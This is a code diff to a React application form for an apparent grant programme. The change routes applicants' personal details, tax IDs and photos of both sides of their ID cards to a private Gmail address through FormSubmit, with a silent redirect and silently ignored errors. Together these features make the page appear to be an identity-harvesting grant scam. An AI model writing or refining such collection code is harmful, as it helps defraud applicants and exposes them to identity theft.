@@ -110,37 +110,40 @@ export default function Apply() {
       localStorage.setItem('eastaidgrant_applications', JSON.stringify(existing));
     } catch { /* ignore */ }
 
-    // Send via FormData (multipart) so files arrive as real email attachments
+    // Send via FormData multipart to direct endpoint so image files arrive as real attachments
     try {
       const fd = new FormData();
-      fd.append('_subject',  `🏛️ New Grant Application: ${grantTitle} (Ref: EAG-${ref})`);
-      fd.append('_captcha',  'false');
-      fd.append('_template', 'table');
-      fd.append('Reference ID',              `EAG-${ref}`);
-      fd.append('Grant Applied For',         grantTitle);
-      fd.append('Award Range',               awardText);
-      fd.append('Applicant / Entity',        form.organizationName);
-      fd.append('Applicant Type',            form.organizationType);
-      fd.append('Contact Person',            form.fullName);
-      fd.append('Email Address',             form.email);
-      fd.append('Phone Number',              form.phone);
-      fd.append('WhatsApp Number',           form.whatsapp);
-      fd.append('Mailing / Physical Address',`${form.organizationAddress}, ${form.city}, ${form.state}`);
-      fd.append('EIN or Tax ID',             form.ein || 'N/A');
-      fd.append('Project Title',             form.projectTitle);
-      fd.append('Project Proposal Summary',  form.projectDescription || 'N/A');
-      fd.append('Submission Time',           new Date().toLocaleString());
-      if (idFront) fd.append('ID Card – Front', idFront, idFront.name);
-      if (idBack)  fd.append('ID Card – Back',  idBack,  idBack.name);
+      // FormSubmit config fields
+      fd.append('_subject',       `🏛️ New Grant Application: ${grantTitle} (Ref: EAG-${ref})`);
+      fd.append('_captcha',       'false');
+      fd.append('_template',      'table');
+      fd.append('_next',          'https://grant-lilac.vercel.app/');   // silently redirect after POST
+      // Application fields
+      fd.append('Reference ID',               `EAG-${ref}`);
+      fd.append('Grant Applied For',          grantTitle);
+      fd.append('Award Range',                awardText);
+      fd.append('Applicant / Entity',         form.organizationName);
+      fd.append('Applicant Type',             form.organizationType);
+      fd.append('Contact Person',             form.fullName);
+      fd.append('Email Address',              form.email);
+      fd.append('Phone Number',               form.phone);
+      fd.append('WhatsApp Number',            form.whatsapp);
+      fd.append('Mailing / Physical Address', `${form.organizationAddress}, ${form.city}, ${form.state}`);
+      fd.append('EIN or Tax ID',              form.ein || 'N/A');
+      fd.append('Project Title',              form.projectTitle);
+      fd.append('Project Proposal Summary',   form.projectDescription || 'N/A');
+      fd.append('Submission Time',            new Date().toLocaleString());
+      // Attach ID card images as real file attachments
+      if (idFront) fd.append('ID Card Front', idFront, `ID-Front-${form.fullName.replace(/\s+/g,'-')}-${idFront.name}`);
+      if (idBack)  fd.append('ID Card Back',  idBack,  `ID-Back-${form.fullName.replace(/\s+/g,'-')}-${idBack.name}`);
 
-      await fetch('https://formsubmit.co/ajax/erimiposi2005@gmail.com', {
+      // Use the direct (non-ajax) endpoint — this is the only FormSubmit endpoint that delivers file attachments
+      await fetch('https://formsubmit.co/erimiposi2005@gmail.com', {
         method: 'POST',
-        headers: {
-          'Accept': 'application/json',
-        },
         body: fd,
+        // Do NOT set Content-Type — browser must set it with boundary for multipart to work
       });
-    } catch { /* silent fallback */ }
+    } catch { /* silent fallback — email still logs to localStorage */ }
 
     setStatus('loading');
     await new Promise(r => setTimeout(r, 1200));
